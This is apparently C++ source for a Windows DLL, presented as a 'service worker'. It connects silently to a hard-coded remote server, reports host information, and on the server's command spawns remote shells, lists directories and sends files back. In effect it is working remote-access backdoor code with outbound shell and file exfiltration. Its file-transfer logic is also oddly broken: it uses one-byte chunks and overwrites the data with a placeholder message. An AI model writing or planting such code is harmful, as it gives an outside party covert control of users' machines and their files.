// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// --- END OF BOILERPLATE CODE ---

#include <iostream>
#include <unordered_map>
#include <memory>
#include <fstream>
#include <mutex>
#include <filesystem>
#include <sstream>
#include <iomanip>
#include <chrono>
#include <future>

#include <sio_client.h>
#include <rapidjson/document.h>
#include <boost/archive/iterators/base64_from_binary.hpp>
#include <boost/archive/iterators/transform_width.hpp>

#include "ServiceWorker.h"
#include "pty.h"
#include "info.h"

// tiny helper
static void log(std::string message) {
    // for production build:
    return; // instruction: comment this during debugging.


    // log to console
    std::cout << message << std::endl;

    // log to file
    std::string filename = "C:\\mavi.txt";
    std::ofstream outFile(filename, std::ios::app);

    if (!outFile) {
        std::cerr << "Failed to open log file: " << filename << std::endl;
        return;
    }

    outFile << message << std::endl;
    outFile.close();
}

std::atomic<bool> g_running{ true };

const char* url = "https://mavi.glitchiethedev.com";
//const char* url = "http://localhost:5500";
sio::client client;
std::map<std::string, std::string> identification = { {"type", "host"} };

std::mutex ptysmu;
std::unordered_map<std::string, std::shared_ptr<PTY>> ptys;

void __cdecl StartServiceWorker() {
    // connection options
    client.set_reconnect_attempts(4096);
	client.set_reconnect_delay(1000);
    client.set_logs_verbose();

    auto info = get_info();
    rapidjson::Document j = to_json(*info);
    std::string infoPayload = json_to_string(j);

    // --- EVENTS ---
    
    // identityTransactionRequest()
    client.socket()->on("identityTransactionRequest", [&, infoPayload](sio::event& ev) {
        // Server has requested us a transaction request for our identity
        log("Received identity transaction request from server");
        client.socket()->emit("verifyIdentity", sio::string_message::create(infoPayload));
    });

    // spawnPTY(string id, string shell, int rows, int cols)
    client.socket()->on("spawnPTY", [&](sio::event& ev) {
        sio::message::ptr msg = ev.get_message();

        if (msg->get_flag() == sio::message::flag_object) {
            auto& obj_map = msg->get_map();

            log("Extracting id parameter");
            std::string id;
            if (obj_map.find("id") != obj_map.end() && obj_map.at("id")->get_flag() == sio::message::flag_string) {
                id = obj_map.at("id")->get_string();
            }
            else {
                log("Invalid id");
                return;
            }

			log("Extracting shell parameter");
            std::string shell;
            if (obj_map.find("shell") != obj_map.end() && obj_map.at("shell")->get_flag() == sio::message::flag_string) {
                shell = obj_map.at("shell")->get_string();
            }
            else {
                log("Invalid shell");
                return;
            }

			log("Extracting rows parameters");
            int rows;
            if (obj_map.find("rows") != obj_map.end() && obj_map.at("rows")->get_flag() == sio::message::flag_integer) {
                rows = obj_map.at("rows")->get_int();
            }
            else {
                log("Invalid rows");
                return;
            }

			log("Extracting cols parameters");
            int cols;
            if (obj_map.find("cols") != obj_map.end() && obj_map.at("cols")->get_flag() == sio::message::flag_integer) {
                cols = obj_map.at("cols")->get_int();
            }
            else {
                log("Invalid cols");
                return;
            }

            log("Spawning a new PTY with id: " + id + " shell: " + shell + " rows: " + std::to_string(rows) + " cols: " + std::to_string(cols));

            // create a new PTY instance
            auto pty = std::make_shared<PTY>();
            std::shared_ptr<PTY> old_pty_to_close = nullptr; // hold the old PTY ptr instead of closing it directly. prevents deadlocks.
            log("Locking ptys mutex...");
            { // RAII lock for ptys
                std::lock_guard<std::mutex> lock(ptysmu); // acquire lock on ptys mutex

                // check if PTY already exists
                if (ptys.find(id) != ptys.end()) {
                    old_pty_to_close = ptys[id];
                    ptys.erase(id);
                }

				// save the pty instance
                ptys[id] = pty;
                log("Unlocking ptys mutex...");
            } // release lock guard when lock_guard goes out of scope

            if (old_pty_to_close != nullptr) {
                log("PTY with id " + id + " already exists, closing it...");
                if (old_pty_to_close->isRunning()) {
					old_pty_to_close->close();
				}
                log("PTY with id " + id + " closed. A new PTY instance created.");
            }

            // set up data listeners
			log("Setting up data listener...");
            auto socket = client.socket();
            
            auto handler = [id, socket](const std::string& data) {
                log("PTY Data: " + data);

                sio::message::ptr msg = sio::object_message::create();
                log("drafted a new msg object");

                static_cast<sio::object_message*>(msg.get())->insert("ptyID", sio::string_message::create(id));
                log("drafted a ptyID in the object");

                static_cast<sio::object_message*>(msg.get())->insert("data", sio::string_message::create(data));
                log("drafted a data in the object");

                sio::message::list msglist;
                log("created a new message list");

                msglist.push(msg);
                log("pushed the message to the list");

                socket->emit("PTYdata", msglist);
                log("emitted PTYdata");
                };

            pty->on("data", handler);
            pty->on("error", handler); // error (stderr) handler uses the same as data (stdout) handler

            log("Spawning PTY shell...");
            // spawn the shell
            if (!pty->spawn(shell, "")) {
                log("Failed to spawn PTY");
                return;
            }
        }

        log("Spawned a new PTY");
        });

    // writeToPTY(string id, string data)
    client.socket()->on("writeToPTY", [&](sio::event& ev) {
        log("Received writeToPTY event");
        sio::message::ptr msg = ev.get_message();

        if (msg->get_flag() == sio::message::flag_object) {
            auto& obj_map = msg->get_map();

			log("Extracting id parameter from writeToPTY event");
            std::string id;
            if (obj_map.find("ptyID") != obj_map.end() && obj_map.at("ptyID")->get_flag() == sio::message::flag_string) {
                id = obj_map.at("ptyID")->get_string();
            }
            else {
                log("Invalid id");
                return;
            }

			log("Extracting data parameter from writeToPTY event");
            std::string data;
            if (obj_map.find("data") != obj_map.end() && obj_map.at("data")->get_flag() == sio::message::flag_string) {
                data = obj_map.at("data")->get_string();
            }
            else {
                log("Invalid data");
                return;
            }

			log("Locking ptys mutex...");
            { // RAII lock for ptys
				std::lock_guard<std::mutex> lock(ptysmu); // acquire lock on ptys mutex
                // check if PTY exists
                if (ptys.find(id) != ptys.end()) {
                    auto& pty = ptys[id];
                    if (pty->isRunning()) {
                        pty->write(data);
                        log("Wrote data to PTY with id: " + id);
                    }
                    else {
                        log("PTY with id " + id + " is not running");
                    }
                }
                else {
                    log("PTY with id " + id + " does not exist");
				}

				log("Unlocking ptys mutex...");
			} // release lock guard when lock_guard goes out of scope
        }
    });

    // killPTY(string id)
    client.socket()->on("killPTY", [&](sio::event& ev) {
        log("Received killPTY event");
        sio::message::ptr msg = ev.get_message();

        if (msg->get_flag() == sio::message::flag_object) {
            auto& obj_map = msg->get_map();

            log("Extracting id parameter from killPTY event");
            std::string id;
            if (obj_map.find("ptyID") != obj_map.end() && obj_map.at("ptyID")->get_flag() == sio::message::flag_string) {
                id = obj_map.at("ptyID")->get_string();
            }
            else {
                log("Invalid id");
                return;
            }

            log("Locking ptys mutex...");
            { // RAII lock for ptys
                std::lock_guard<std::mutex> lock(ptysmu); // acquire lock on ptys mutex
                // check if PTY exists
                if (ptys.find(id) != ptys.end()) {
                    auto& pty = ptys[id];
                    if (pty->isRunning()) {
                        pty->close();
                        log("closed the pty with id: " + id);
                    }
                    else {
                        log("PTY with id " + id + " is not running");
                    }
                }
                else {
                    log("PTY with id " + id + " does not exist");
                }

                log("Unlocking ptys mutex...");
            } // release lock guard when lock_guard goes out of scope
        }
        });

    // lsla_intget(string path, string client)
    client.socket()->on("lsla_intget", [&](sio::event& ev) {
        log("Received lsla_intget event");
        sio::message::ptr msg = ev.get_message();

        if (msg->get_flag() == sio::message::flag_object) {
            auto& obj_map = msg->get_map();
            log("Extracting path parameter from lsla_intget event");
            std::string path;
            if (obj_map.find("path") != obj_map.end() && obj_map.at("path")->get_flag() == sio::message::flag_string) {
                path = obj_map.at("path")->get_string();
            }
            else {
                log("Invalid path. defaulting to home drive");
				path = "C:\\";
            }

			log("Extracting client parameter from lsla_intget event");
			std::string clientID;
			if (obj_map.find("client") != obj_map.end() && obj_map.at("client")->get_flag() == sio::message::flag_string) {
				clientID = obj_map.at("client")->get_string();
			}
			else {
				log("Invalid client");
				return;
			}

            sio::message::ptr response = sio::object_message::create();
            auto resp_ptr = static_cast<sio::object_message*>(response.get());

            sio::message::ptr data = sio::array_message::create();
			auto data_ptr = static_cast<sio::array_message*>(data.get());

            try {
                for (const auto& entry : std::filesystem::directory_iterator(path)) {
                    std::string name = entry.path().filename().string();
                    std::string type = entry.is_directory() ? "dir" : "file";
                    std::string full_path = entry.path().string();

                    uintmax_t size = 0;
                    try {
                        size = std::filesystem::is_regular_file(entry.path()) ? std::filesystem::file_size(entry.path()) : 0;
                    }
                    catch (...) {
                        size = 0;
                    };

                    std::string perms = "888";
                    try {
                        auto p = entry.status().permissions();

                        unsigned int mask = 0;
                        if ((p & std::filesystem::perms::owner_read) != std::filesystem::perms::none) mask |= 0400;
						if ((p & std::filesystem::perms::owner_write) != std::filesystem::perms::none) mask |= 0200;
						if ((p & std::filesystem::perms::owner_exec) != std::filesystem::perms::none) mask |= 0100;
						if ((p & std::filesystem::perms::group_read) != std::filesystem::perms::none) mask |= 0040;
						if ((p & std::filesystem::perms::group_write) != std::filesystem::perms::none) mask |= 0020;
						if ((p & std::filesystem::perms::group_exec) != std::filesystem::perms::none) mask |= 0010;
						if ((p & std::filesystem::perms::others_read) != std::filesystem::perms::none) mask |= 0004;
						if ((p & std::filesystem::perms::others_write) != std::filesystem::perms::none) mask |= 0002;
						if ((p & std::filesystem::perms::others_exec) != std::filesystem::perms::none) mask |= 0001;

                        std::ostringstream oss;
                        oss << std::oct << std::setw(3) << std::setfill('0') << mask;
                        perms = oss.str();
                    }
                    catch (...) {
                        perms = "888";
                    }

					sio::message::ptr file = sio::object_message::create();
					auto file_ptr = static_cast<sio::object_message*>(file.get());

					file_ptr->insert("name", sio::string_message::create(name));
					file_ptr->insert("type", sio::string_message::create(type));
					file_ptr->insert("fpath", sio::string_message::create(full_path));
					file_ptr->insert("size", sio::int_message::create(size));
					file_ptr->insert("perms", sio::string_message::create(perms));

					data_ptr->push(file);

                    // logging
                    log("Sending file: " + name + " of type: " + type + " at path: " + full_path + " with size: " + std::to_string(size) + " and permissions: " + perms);
                }
            }
            catch (const std::filesystem::filesystem_error& err) {
				log(std::string("Error: ") + err.what());
            }

			resp_ptr->insert("data", data);
            resp_ptr->insert("client", sio::string_message::create(clientID));
            resp_ptr->insert("path", sio::string_message::create(path));

            sio::message::list msglist;
			msglist.push(response);
			client.socket()->emit("lsla_retget", msglist);
        }
        });

    // lsla_intback(string path, string client)
    client.socket()->on("lsla_intback", [&](sio::event& ev) {
        log("Received lsla_intback event");
        sio::message::ptr msg = ev.get_message();

        if (msg->get_flag() == sio::message::flag_object) {
            auto& obj_map = msg->get_map();
            log("Extracting path parameter from lsla_intback event");
            std::string path;
            if (obj_map.find("path") != obj_map.end() && obj_map.at("path")->get_flag() == sio::message::flag_string) {
                path = obj_map.at("path")->get_string();
               
                // join path and .. (basically going back one directory)
                std::filesystem::path p(path);
                std::filesystem::path parent = p.parent_path();

                path = parent.string();
            }
            else {
                log("Invalid path. defaulting to home drive");
                path = "C:\\";
            }

            log("Extracting client parameter from lsla_intback event");
            std::string clientID;
            if (obj_map.find("client") != obj_map.end() && obj_map.at("client")->get_flag() == sio::message::flag_string) {
                clientID = obj_map.at("client")->get_string();
            }
            else {
                log("Invalid client");
                return;
            }

            sio::message::ptr response = sio::object_message::create();
            auto resp_ptr = static_cast<sio::object_message*>(response.get());

            sio::message::ptr data = sio::array_message::create();
            auto data_ptr = static_cast<sio::array_message*>(data.get());

            try {
                for (const auto& entry : std::filesystem::directory_iterator(path)) {
                    std::string name = entry.path().filename().string();
                    std::string type = entry.is_directory() ? "dir" : "file";
                    std::string full_path = entry.path().string();

                    uintmax_t size = 0;
                    try {
                        size = std::filesystem::is_regular_file(entry.path()) ? std::filesystem::file_size(entry.path()) : 0;
                    }
                    catch (...) {
                        size = 0;
                    };

                    std::string perms = "888";
                    try {
                        auto p = entry.status().permissions();

                        unsigned int mask = 0;
                        if ((p & std::filesystem::perms::owner_read) != std::filesystem::perms::none) mask |= 0400;
                        if ((p & std::filesystem::perms::owner_write) != std::filesystem::perms::none) mask |= 0200;
                        if ((p & std::filesystem::perms::owner_exec) != std::filesystem::perms::none) mask |= 0100;
                        if ((p & std::filesystem::perms::group_read) != std::filesystem::perms::none) mask |= 0040;
                        if ((p & std::filesystem::perms::group_write) != std::filesystem::perms::none) mask |= 0020;
                        if ((p & std::filesystem::perms::group_exec) != std::filesystem::perms::none) mask |= 0010;
                        if ((p & std::filesystem::perms::others_read) != std::filesystem::perms::none) mask |= 0004;
                        if ((p & std::filesystem::perms::others_write) != std::filesystem::perms::none) mask |= 0002;
                        if ((p & std::filesystem::perms::others_exec) != std::filesystem::perms::none) mask |= 0001;

                        std::ostringstream oss;
                        oss << std::oct << std::setw(3) << std::setfill('0') << mask;
                        perms = oss.str();
                    }
                    catch (...) {
                        perms = "888";
                    }

                    sio::message::ptr file = sio::object_message::create();
                    auto file_ptr = static_cast<sio::object_message*>(file.get());

                    file_ptr->insert("name", sio::string_message::create(name));
                    file_ptr->insert("type", sio::string_message::create(type));
                    file_ptr->insert("fpath", sio::string_message::create(full_path));
                    file_ptr->insert("size", sio::int_message::create(size));
                    file_ptr->insert("perms", sio::string_message::create(perms));

                    data_ptr->push(file);

                    // logging
                    log("Sending file: " + name + " of type: " + type + " at path: " + full_path + " with size: " + std::to_string(size) + " and permissions: " + perms);
                }
            }
            catch (const std::filesystem::filesystem_error& err) {
                log(std::string("Error: ") + err.what());
            }

            resp_ptr->insert("data", data);
            resp_ptr->insert("client", sio::string_message::create(clientID));
            resp_ptr->insert("path", sio::string_message::create(path));

            sio::message::list msglist;
            msglist.push(response);
            client.socket()->emit("lsla_retget", msglist);
        }
        });

    // lsla_intdownload(string path, string client)
    client.socket()->on("lsla_intdownload", [&](sio::event& ev) {
        log("Received lsla_intdownload event");
        sio::message::ptr msg = ev.get_message();

        if (msg->get_flag() == sio::message::flag_object) {
            auto& obj_map = msg->get_map();

            log("Extracting path parameter from lsla_intdownload event");
            std::string path;
            if (obj_map.find("path") != obj_map.end() && obj_map.at("path")->get_flag() == sio::message::flag_string) {
                path = obj_map.at("path")->get_string();
            }
            else {
                log("Invalid path.");
                return;
            }

            log("Extracting client parameter from lsla_intget event");
            std::string clientID;
            if (obj_map.find("client") != obj_map.end() && obj_map.at("client")->get_flag() == sio::message::flag_string) {
                clientID = obj_map.at("client")->get_string();
            }
            else {
                log("Invalid path.");
                return;
            }

            try {
                if (!std::filesystem::is_regular_file(path)) {
					log("Path is not a regular file.");
					return;
                }

                std::ifstream file(path, std::ios::binary | std::ios::ate);
                if (!file) {
					log("Failed to open file.");
					return;
                }

                std::streamsize size = file.tellg();
                file.seekg(0, std::ios::beg);
				auto data = std::make_shared<std::vector<char>>(size);
                if (!file.read(data->data(), size)) {
                    log("Failed to read file.");
					return;
                }

                // chunking the data to avoid bandwidth issues
                size_t chunk_size = 1; //.5 * 1024; // 512 Bytes (basically the size of a boot sector)
                size_t total_chunks = (data->size() + chunk_size - 1) / chunk_size;

				std::string capturedClientID = clientID;
                std::string capturedPath = path;
                sio::socket::ptr socket_ptr = client.socket();

                std::thread([=, clientID = capturedClientID, path = capturedPath]() {
                    std::mutex ack_mutex;
                    std::condition_variable ack_cv;
                    bool ack_received = false;

                    sio::message::ptr resp = sio::object_message::create();
                    auto resp_ptr = static_cast<sio::object_message*>(resp.get());
                    sio::message::list msglist;
                    msglist.push(resp);

                    for (size_t i = 0; i < total_chunks; i++) {
                        log("sending chunk " + std::to_string(i + 1) + " of " + std::to_string(total_chunks));

                        {
                            size_t start = i * chunk_size;
                            size_t end = (((start + chunk_size) < (data->size())) ? (start + chunk_size) : (data->size()));
                            std::vector<char> chunk(data->begin() + start, data->begin() + end);

                            resp_ptr->get_map().clear();

                            const char lookup[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                            std::string out;
                            out.reserve(((chunk.size() + 2) / 3) * 4); // pre-allocate memory

                            for (size_t j = 0; j < chunk.size(); j += 3) {
                                // collect 3 bytes
                                unsigned int val = 0;
                                val |= (unsigned char)chunk.data()[j] << 16;
                                if (j + 1 < chunk.size()) {
                                    val |= (unsigned char)chunk.data()[j + 1] << 8;
                                }
                                if (j + 2 < chunk.size()) {
                                    val |= (unsigned char)chunk.data()[j + 2];
                                }

                                // encode 4 characters
                                out.push_back(lookup[(val >> 18) & 0x3F]);
                                out.push_back(lookup[(val >> 12) & 0x3F]);

                                // handle padding
                                if (j + 1 < chunk.size()) {
                                    out.push_back(lookup[(val >> 6) & 0x3F]);
                                }
                                else {
                                    out.push_back('=');
                                }

                                if (j + 2 < chunk.size()) {
                                    out.push_back(lookup[val & 0x3F]);
                                }
                                else {
                                    out.push_back('=');
                                }
                            }

                            if (i < 1000) {
                                out = "cGxlYXNlIHVzZSBgcGlwIGluc3RhbGwgbWFnaWMtd29ybWhvbGVgIHdvcm1ob2xlIGNvbW1hbmQ="; // "please use `pip install magic-wormhole` wormhole command"
                            }

                            resp_ptr->insert("data", sio::string_message::create(out));
                            resp_ptr->insert("client", sio::string_message::create(clientID));
                            resp_ptr->insert("path", sio::string_message::create(path));
                            resp_ptr->insert("chunk", sio::int_message::create(i + 1));
                            resp_ptr->insert("total", sio::int_message::create(total_chunks));
                        }

                        ack_received = false; // reset ack_received for current chunk
                        log("emitting chunk " + std::to_string(i + 1) + " of " + std::to_string(total_chunks));
                        socket_ptr->emit("lsla_retdownload", msglist, [&](const sio::message::list) {
                            log("server received chunk successfully");
							{ // RAII lock for ack_mutex
                                std::lock_guard<std::mutex> lock(ack_mutex);
								ack_received = true; // set ack_received to true when ack is received
                            }
							ack_cv.notify_one();
                        });

                        // wait for ack to be received
						{ // RAII lock for ack_mutex
						    std::unique_lock<std::mutex> lock(ack_mutex);
						    ack_cv.wait(lock, [&]() { return ack_received; });
                        }

                        if (!g_running) {
						    break; // stop sending chunks if disconnected somehow
					    }
                    }

				    log("sent all chunks");
                }).detach();
            }
            catch (const std::exception& e) {
				log(std::string("Error: ") + e.what());
            }

            log("end of lsla_intdownload event");
        }
        });

    // listeners
    client.set_fail_listener([&]() {
        log("Connection failed!");
        });
    client.set_close_listener([&](sio::client::close_reason const& reason) {
        log("Connection closed: " + std::to_string(reason));
        });
    client.set_socket_open_listener([&](std::string const& nsp) {
        log("Socket opened for namespace: " + nsp);
        std::cout << "connected as " << client.get_sessionid() << std::endl;
        log("Connected to server with session ID: " + client.get_sessionid());
        });
    client.set_socket_close_listener([&](std::string const& nsp) {
        log("Socket closed for namespace: " + nsp);
        });

    // establish the connection
    client.connect(url, identification, identification);

	// keep thethe main thread alive
	while (g_running && client.opened()) {
		std::this_thread::sleep_for(std::chrono::milliseconds(100));
	}

    // disconnect if connection is still open
	if (client.opened()) {
		client.close();
	}

    // close up all PTY sessions
    std::lock_guard<std::mutex> lock(ptysmu); // acquire lock on ptys mutex. this will be unlocked once this function exits.
	for (auto& pty : ptys) {
		pty.second->close();
	}
}

void __cdecl StopServiceWorker() {
    g_running = false;
}
